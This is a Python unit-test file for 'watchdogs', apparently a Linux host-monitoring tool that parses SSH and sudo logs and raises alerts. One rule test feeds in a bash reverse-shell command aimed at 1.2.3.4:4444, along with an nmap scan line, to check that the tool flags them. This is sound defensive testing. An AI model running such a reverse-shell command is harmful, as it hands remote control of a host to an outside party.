"""Parser, rule, engine, and TUI smoke tests."""

from __future__ import annotations

import tempfile
import unittest
from datetime import datetime
from pathlib import Path

from watchdogs.auth import parse_auth_line, sudo_command_event
from watchdogs.config import DEFAULTS, apply_form_values, load_config, save_config
from watchdogs.demo import scripted_events
from watchdogs.engine import Engine, format_headless
from watchdogs.models import CommandEvent, LoginEvent
from watchdogs.rules import RuleEngine
from watchdogs.protocol import decode_payload, encode_event, parse_endpoint
from watchdogs.settings import values_from_engine
from watchdogs.report import ReportClient, ReportServer
from watchdogs.procs import is_internal_command, is_user_command
from watchdogs.shellcmds import parse_typed_log_line, parse_zsh_history_line, should_keep_typed
from watchdogs.sessions import parse_who_line
from watchdogs.pair import agent_command, pairing_card, persist_pair
from watchdogs.store import Store
from watchdogs.__main__ import _normalize_argv


def _store() -> Store:
    tmp = Path(tempfile.mkdtemp(prefix="watchdogs-test-"))
    return Store(tmp)


class ParseAuthTests(unittest.TestCase):
    def test_accepted_publickey_syslog(self) -> None:
        line = (
            "Sep 23 09:11:02 archlinux sshd[1234]: "
            "Accepted publickey for kskroyal from 192.168.1.10 port 52222 ssh2"
        )
        event = parse_auth_line(line, now=datetime(2026, 9, 23, 9, 11, 2))
        assert event is not None
        self.assertEqual(event.result, "accepted")
        self.assertEqual(event.username, "kskroyal")
        self.assertEqual(event.source_ip, "192.168.1.10")
        self.assertEqual(event.method, "publickey")
        self.assertEqual(event.service, "sshd")
        self.assertEqual(event.ts, datetime(2026, 9, 23, 9, 11, 2))

    def test_accepted_iso_journal(self) -> None:
        line = (
            "2026-09-23T09:11:02-0300 archlinux sshd[1234]: "
            "Accepted password for alice from 10.0.0.5 port 22 ssh2"
        )
        event = parse_auth_line(line)
        assert event is not None
        self.assertEqual(event.username, "alice")
        self.assertEqual(event.method, "password")
        self.assertEqual(event.source_ip, "10.0.0.5")
        self.assertEqual(event.ts, datetime(2026, 9, 23, 9, 11, 2))

    def test_failed_and_invalid(self) -> None:
        failed = parse_auth_line(
            "Sep 23 09:10:44 host sshd[1]: Failed password for admin from 8.8.8.8 port 22 ssh2",
            now=datetime(2026, 9, 23),
        )
        assert failed is not None
        self.assertEqual(failed.result, "failed")
        self.assertEqual(failed.username, "admin")

        invalid_fail = parse_auth_line(
            "Sep 23 09:10:44 host sshd[1]: Failed password for invalid user admin from 8.8.8.8 port 22 ssh2",
            now=datetime(2026, 9, 23),
        )
        assert invalid_fail is not None
        self.assertEqual(invalid_fail.result, "invalid")

        invalid = parse_auth_line(
            "Sep 23 09:10:44 host sshd[1]: Invalid user ghost from 198.51.100.2 port 22",
            now=datetime(2026, 9, 23),
        )
        assert invalid is not None
        self.assertEqual(invalid.result, "invalid")
        self.assertEqual(invalid.username, "ghost")

    def test_sudo_and_command(self) -> None:
        line = (
            "Sep 23 09:12:00 host sudo: kskroyal : TTY=pts/0 ; PWD=/home/kskroyal ; "
            "USER=root ; COMMAND=/usr/bin/vim /etc/ssh/sshd_config"
        )
        event = parse_auth_line(line, now=datetime(2026, 9, 23))
        assert event is not None
        self.assertEqual(event.result, "sudo")
        self.assertEqual(event.extra["target"], "root")
        command = sudo_command_event(event)
        assert command is not None
        self.assertEqual(command.cmdline, "/usr/bin/vim /etc/ssh/sshd_config")
        self.assertEqual(command.source, "sudo")
        self.assertEqual(command.username, "kskroyal")

    def test_su_and_session(self) -> None:
        su = parse_auth_line(
            "Sep 23 09:12:01 host su: (to root) kskroyal on pts/0",
            now=datetime(2026, 9, 23),
        )
        assert su is not None
        self.assertEqual(su.result, "su")
        self.assertEqual(su.extra["target"], "root")

        opened = parse_auth_line(
            "Sep 23 09:12:02 host login[1]: pam_unix(login:session): "
            "session opened for user kskroyal(uid=1000) by (uid=0)",
            now=datetime(2026, 9, 23),
        )
        assert opened is not None
        self.assertEqual(opened.result, "session_open")
        self.assertEqual(opened.username, "kskroyal")

    def test_unrelated_line(self) -> None:
        self.assertIsNone(parse_auth_line("Sep 23 09:12:02 host systemd[1]: Started cron."))


class SessionParseTests(unittest.TestCase):
    def test_who_line(self) -> None:
        session = parse_who_line("kskroyal pts/0        2026-09-23 08:00 (192.168.1.10)")
        assert session is not None
        self.assertEqual(session.username, "kskroyal")
        self.assertEqual(session.tty, "pts/0")
        self.assertEqual(session.source, "192.168.1.10")
        self.assertIn("2026-09-23", session.since)


class SelfFilterTests(unittest.TestCase):
    def test_drops_own_process_and_watchdogs_cli(self) -> None:
        import os

        own = CommandEvent(
            ts=datetime(2026, 9, 23, 14, 0, 0),
            pid=os.getpid(),
            ppid=1,
            uid=1000,
            username="kskroyal",
            cmdline="python -m watchdogs --demo",
        )
        named = CommandEvent(
            ts=datetime(2026, 9, 23, 14, 0, 0),
            pid=999991,
            ppid=1,
            uid=1000,
            username="kskroyal",
            cmdline=".venv/bin/python -m watchdogs listen --token x",
            exe="/home/kskroyal/WatchDogs/.venv/bin/watchdogs",
        )
        self.assertTrue(is_internal_command(own))
        self.assertTrue(is_internal_command(named))

    def test_interactive_filter_drops_background_exec(self) -> None:
        background = CommandEvent(
            ts=datetime(2026, 9, 23, 14, 0, 0),
            pid=999993,
            ppid=1,
            uid=0,
            username="root",
            cmdline="/usr/lib/systemd/systemd-udevd",
            source="exec",
        )
        terminal = CommandEvent(
            ts=datetime(2026, 9, 23, 14, 0, 0),
            pid=999994,
            ppid=1,
            uid=1000,
            username="kskroyal",
            cmdline="vim /etc/hosts",
            tty="pts/0",
            source="exec",
        )
        sudoed = CommandEvent(
            ts=datetime(2026, 9, 23, 14, 0, 0),
            pid=0,
            ppid=0,
            uid=0,
            username="kskroyal",
            cmdline="/bin/bash",
            source="sudo",
        )
        chrome = CommandEvent(
            ts=datetime(2026, 9, 23, 14, 0, 0),
            pid=999995,
            ppid=1,
            uid=1000,
            username="kskroyal",
            cmdline="/usr/lib/chromium/chromium --type=renderer",
            tty="tty1",
            source="exec",
        )
        cursor = CommandEvent(
            ts=datetime(2026, 9, 23, 14, 0, 0),
            pid=999996,
            ppid=1,
            uid=1000,
            username="kskroyal",
            cmdline="/usr/share/cursor/cursor",
            source="exec",
        )
        self.assertFalse(is_user_command(background, interactive_only=True))
        self.assertTrue(is_user_command(terminal, interactive_only=True))
        self.assertTrue(is_user_command(sudoed, interactive_only=True))
        self.assertFalse(is_user_command(chrome, interactive_only=True))
        self.assertFalse(is_user_command(cursor, interactive_only=True))
        starship = CommandEvent(
            ts=datetime(2026, 9, 23, 14, 0, 0),
            pid=79003,
            ppid=1,
            uid=1000,
            username="kskroyal",
            cmdline="/usr/bin/starship prompt --right --status=127",
            tty="pts/2",
            source="exec",
        )
        self.assertFalse(is_user_command(starship, interactive_only=True))
        self.assertFalse(should_keep_typed("starship module character"))

    def test_typed_history_parsers(self) -> None:
        ts, cmd = parse_zsh_history_line(": 1770000000:0;gti status")
        self.assertEqual(cmd, "gti status")
        self.assertIsNotNone(ts)
        event = parse_typed_log_line("2026-09-23T09:42:32|kskroyal|pts/2|gti status")
        assert event is not None
        self.assertEqual(event.cmdline, "gti status")
        self.assertEqual(event.source, "shell")
        self.assertTrue(is_user_command(event, interactive_only=True))

    def test_keeps_real_user_commands(self) -> None:
        event = CommandEvent(
            ts=datetime(2026, 9, 23, 14, 0, 0),
            pid=999992,
            ppid=1,
            uid=0,
            username="root",
            cmdline="vim /etc/ssh/sshd_config",
        )
        self.assertFalse(is_internal_command(event))


class RuleTests(unittest.TestCase):
    def setUp(self) -> None:
        self.store = _store()
        self.rules = RuleEngine(DEFAULTS, self.store)

    def tearDown(self) -> None:
        self.store.close()

    def test_root_ssh_and_new_ip(self) -> None:
        event = LoginEvent(
            ts=datetime(2026, 9, 23, 14, 0, 0),
            result="accepted",
            username="root",
            source_ip="198.51.100.44",
            method="password",
            service="sshd",
        )
        alerts = self.rules.evaluate("login", event)
        names = {item.rule for item in alerts}
        self.assertIn("root_ssh", names)
        self.assertIn("new_source_ip", names)
        again = LoginEvent(
            ts=datetime(2026, 9, 23, 14, 5, 0),
            result="accepted",
            username="root",
            source_ip="198.51.100.44",
            method="password",
            service="sshd",
        )
        second = {item.rule for item in self.rules.evaluate("login", again)}
        self.assertIn("root_ssh", second)
        self.assertNotIn("new_source_ip", second)

    def test_failed_burst_and_invalid(self) -> None:
        alerts: list[str] = []
        for index in range(5):
            event = LoginEvent(
                ts=datetime(2026, 9, 23, 14, 0, index),
                result="failed" if index < 4 else "invalid",
                username="admin",
                source_ip="203.0.113.8",
                method="password",
                service="sshd",
            )
            alerts.extend(item.rule for item in self.rules.evaluate("login", event))
        self.assertIn("failed_login_burst", alerts)
        self.assertIn("invalid_user", alerts)

    def test_off_hours(self) -> None:
        event = LoginEvent(
            ts=datetime(2026, 9, 23, 2, 15, 0),
            result="accepted",
            username="alice",
            source_ip="10.0.0.9",
            method="publickey",
            service="sshd",
        )
        names = {item.rule for item in self.rules.evaluate("login", event)}
        self.assertIn("off_hours_login", names)

    def test_sudo_shell_and_patterns(self) -> None:
        sudo = LoginEvent(
            ts=datetime(2026, 9, 23, 14, 0, 0),
            result="sudo",
            username="kskroyal",
            service="sudo",
            extra={"target": "root", "command": "/bin/bash"},
        )
        self.assertIn("sudo_shell", {item.rule for item in self.rules.evaluate("login", sudo)})

        nmap = CommandEvent(
            ts=datetime(2026, 9, 23, 14, 0, 1),
            pid=1,
            ppid=1,
            uid=0,
            username="root",
            cmdline="nmap -sS 10.0.0.0/24",
        )
        nmap_alerts = self.rules.evaluate("command", nmap)
        self.assertTrue(nmap_alerts)
        self.assertEqual(nmap_alerts[0].rule, "suspicious_command")

        rev = CommandEvent(
            ts=datetime(2026, 9, 23, 14, 0, 2),
            pid=2,
            ppid=1,
            uid=0,
            username="root",
            cmdline="bash -c 'bash -i >& /dev/tcp/1.2.3.4/4444 0>&1'",
        )
        rev_alerts = self.rules.evaluate("command", rev)
        self.assertTrue(rev_alerts)
        self.assertEqual(rev_alerts[0].severity, "critical")

    def test_su_root(self) -> None:
        event = LoginEvent(
            ts=datetime(2026, 9, 23, 14, 0, 0),
            result="su",
            username="kskroyal",
            service="su",
            extra={"target": "root"},
        )
        self.assertIn("su_root", {item.rule for item in self.rules.evaluate("login", event)})


class EngineDemoTests(unittest.TestCase):
    def test_demo_headless_emits_alerts(self) -> None:
        cfg = load_config()
        cfg["data_dir"] = tempfile.mkdtemp(prefix="watchdogs-engine-")
        engine = Engine(cfg, demo=True)
        seen: list[str] = []

        def capture(kind: str, payload: object) -> None:
            line = format_headless(kind, payload)
            if line:
                seen.append(line)

        engine.add_listener(capture)
        engine.start()
        # scripted burst is 0.15s * ~14 events
        import time

        time.sleep(2.5)
        engine.stop()
        self.assertGreater(engine.login_count, 0)
        self.assertGreater(engine.command_count, 0)
        self.assertGreater(engine.alert_count, 0)
        self.assertTrue(any("ALERT" in line for line in seen))
        self.assertTrue(any("LOGIN" in line for line in seen))
        self.assertTrue(any("EXEC" in line for line in seen))
        self.assertTrue(scripted_events())


class ProtocolTests(unittest.TestCase):
    def test_parse_endpoint(self) -> None:
        self.assertEqual(parse_endpoint("192.168.1.10:9000"), ("192.168.1.10", 9000))
        self.assertEqual(parse_endpoint("dashboard"), ("dashboard", 8765))

    def test_roundtrip_login_and_sessions(self) -> None:
        login = LoginEvent(
            ts=datetime(2026, 9, 23, 9, 0, 0),
            result="accepted",
            username="alice",
            source_ip="10.0.0.2",
            method="publickey",
            service="sshd",
        )
        message = encode_event("login", login, "srv1")
        assert message is not None
        restored = decode_payload("login", message["payload"])
        assert isinstance(restored, LoginEvent)
        self.assertEqual(restored.username, "alice")
        self.assertEqual(restored.source_ip, "10.0.0.2")

        from watchdogs.models import Session

        wrapped = encode_event(
            "sessions",
            [Session(username="alice", tty="pts/0", source="10.0.0.2", since="now")],
            "srv1",
        )
        assert wrapped is not None
        sessions = decode_payload("sessions", wrapped["payload"])
        assert isinstance(sessions, list)
        self.assertEqual(sessions[0].username, "alice")


class ReportLoopbackTests(unittest.TestCase):
    def test_agent_reports_to_listener(self) -> None:
        import time

        token = "loopback-token"
        listen_cfg = load_config()
        listen_cfg["data_dir"] = tempfile.mkdtemp(prefix="watchdogs-listen-")
        receiver = Engine(listen_cfg, receiver=True)
        server = ReportServer("127.0.0.1", 0, token, receiver.submit, receiver.set_link)
        receiver.attach(server)
        receiver.start()
        self.assertTrue(server.ready.wait(3))
        port = server.actual_port
        assert port is not None

        agent_cfg = load_config()
        agent_cfg["data_dir"] = tempfile.mkdtemp(prefix="watchdogs-agent-")
        agent = Engine(agent_cfg, demo=True)
        client = ReportClient(
            "127.0.0.1",
            port,
            token,
            local_host="demo-host",
            counts=agent.host_status,
            reconnect_sec=1,
        )
        agent.add_listener(client.on_event)
        agent.attach(client)
        agent.start()
        try:
            deadline = time.monotonic() + 4
            while time.monotonic() < deadline and receiver.login_count < 1:
                time.sleep(0.1)
            self.assertGreater(receiver.login_count, 0)
            self.assertGreater(receiver.alert_count, 0)
            self.assertEqual(receiver.remote_host, "demo-host")
        finally:
            agent.stop()
            receiver.stop()

    def test_bad_token_rejected(self) -> None:
        import time

        listen_cfg = load_config()
        listen_cfg["data_dir"] = tempfile.mkdtemp(prefix="watchdogs-badtok-")
        receiver = Engine(listen_cfg, receiver=True)
        server = ReportServer("127.0.0.1", 0, "correct-token", receiver.submit, receiver.set_link)
        receiver.attach(server)
        receiver.start()
        self.assertTrue(server.ready.wait(3))
        port = server.actual_port
        assert port is not None

        agent_cfg = load_config()
        agent_cfg["data_dir"] = tempfile.mkdtemp(prefix="watchdogs-badtok-agent-")
        agent = Engine(agent_cfg, demo=True)
        client = ReportClient("127.0.0.1", port, "wrong-token", reconnect_sec=1)
        agent.add_listener(client.on_event)
        agent.attach(client)
        agent.start()
        try:
            time.sleep(1.2)
            self.assertEqual(receiver.login_count, 0)
            self.assertNotEqual(receiver.link_status, "up")
        finally:
            agent.stop()
            receiver.stop()


class PairingTests(unittest.TestCase):
    def test_agent_command_and_card(self) -> None:
        cmd = agent_command("192.168.1.10:8765", "secret-token")
        self.assertIn("--report 192.168.1.10:8765", cmd)
        self.assertIn("--token secret-token", cmd)
        card = pairing_card("secret-token", 8765)
        self.assertIn("secret-token", card)
        self.assertIn("sudo python -m watchdogs", card)
        tunneled = pairing_card("secret-token", 8765, via_ssh="user@box")
        self.assertIn("127.0.0.1:8765", tunneled)
        self.assertIn("user@box", tunneled)

    def test_normalize_pair_listen_agent(self) -> None:
        import sys

        old = sys.argv
        try:
            sys.argv = ["watchdogs", "pair", "--ssh", "me@host"]
            self.assertEqual(_normalize_argv(None), ["--listen", "--pair", "--ssh", "me@host"])
            sys.argv = ["watchdogs", "agent", "--report", "127.0.0.1:8765"]
            self.assertEqual(_normalize_argv(None), ["--headless", "--report", "127.0.0.1:8765"])
        finally:
            sys.argv = old

    def test_persist_token(self) -> None:
        dest = Path(tempfile.mkdtemp(prefix="watchdogs-pair-")) / "config.yaml"
        cfg = load_config()
        cfg["_config_path"] = str(dest)
        persist_pair(cfg, "abc123", "0.0.0.0:8765")
        loaded = load_config(dest)
        self.assertEqual(loaded["report"]["token"], "abc123")


class SettingsTests(unittest.TestCase):
    def test_save_and_apply_thresholds(self) -> None:
        dest = Path(tempfile.mkdtemp(prefix="watchdogs-cfg-")) / "config.yaml"
        cfg = load_config()
        cfg["_config_path"] = str(dest)
        cfg["data_dir"] = str(dest.parent)
        engine = Engine(cfg, demo=True)
        values = values_from_engine(engine)
        values["failed_login_threshold"] = 2
        values["failed_login_window_sec"] = 60
        values["always_alert_root_login"] = False
        values["server"] = ""
        values["token"] = "dashboard-token"
        try:
            message = engine.apply_settings(values)
            self.assertEqual(engine.rules.failed_threshold, 2)
            self.assertFalse(engine.rules.alert_root)
            self.assertIn("saved", message)
            loaded = load_config(dest)
            self.assertEqual(loaded["alerts"]["failed_login_threshold"], 2)
            self.assertEqual(loaded["report"]["token"], "dashboard-token")
        finally:
            engine.store.close()

    def test_form_values_roundtrip(self) -> None:
        cfg = load_config()
        cfg["alerts"]["failed_login_threshold"] = 8
        apply_form_values(
            cfg,
            {
                "server": "10.0.0.2:9000",
                "bind": "0.0.0.0:8765",
                "token": "abc",
                "reconnect_sec": 4,
                "failed_login_threshold": 8,
                "failed_login_window_sec": 120,
                "always_alert_root_login": True,
                "new_source_ip": False,
                "alert_sudo_shell": True,
                "off_hours_start": 22,
                "off_hours_end": 5,
            },
        )
        path = Path(tempfile.mkdtemp(prefix="watchdogs-save-")) / "config.yaml"
        save_config(cfg, path)
        loaded = load_config(path)
        self.assertEqual(loaded["report"]["server"], "10.0.0.2:9000")
        self.assertFalse(loaded["alerts"]["new_source_ip"])
        self.assertEqual(loaded["alerts"]["off_hours"]["start"], 22)


class TuiSmokeTests(unittest.IsolatedAsyncioTestCase):
    async def test_app_starts_and_renders(self) -> None:
        from watchdogs.tui import WatchDogsApp

        cfg = load_config()
        cfg["data_dir"] = tempfile.mkdtemp(prefix="watchdogs-tui-")
        cfg["_config_path"] = str(Path(cfg["data_dir"]) / "config.yaml")
        engine = Engine(cfg, demo=True)
        engine.start()
        app = WatchDogsApp(engine)
        try:
            async with app.run_test() as pilot:
                await pilot.pause(0.8)
                header = str(app.query_one("#header-bar").render())
                self.assertIn("WATCH", header)
                self.assertIn("HOST MONITOR", header)
                from textual.widgets import DataTable

                table = app.query_one("#commands", DataTable)
                before = table.row_count
                app.action_toggle_follow()
                self.assertFalse(app._follow_commands)
                app._apply(
                    "command",
                    CommandEvent(
                        ts=datetime(2026, 9, 23, 14, 0, 0),
                        pid=42,
                        ppid=1,
                        uid=1000,
                        username="kskroyal",
                        cmdline="echo should-stay-held",
                        source="demo",
                    ),
                )
                self.assertEqual(table.row_count, before)
                self.assertEqual(len(app._held_commands), 1)
                app.action_toggle_follow()
                self.assertEqual(len(app._held_commands), 0)
                self.assertGreater(table.row_count, before)
                self.assertIn("should-stay-held", app.all_commands_text())
                app.action_focus_alerts()
                self.assertTrue(app.query_one("#alerts").has_focus)
                app.action_open_settings()
                await pilot.pause()
                self.assertTrue(app.screen.query("#settings-title"))
                from textual.widgets import Input

                app.screen.query_one("#in-fail-count", Input).value = "9"
                await pilot.click("#save")
                await pilot.pause()
                self.assertEqual(engine.rules.failed_threshold, 9)
        finally:
            engine.stop()


if __name__ == "__main__":
    unittest.main()
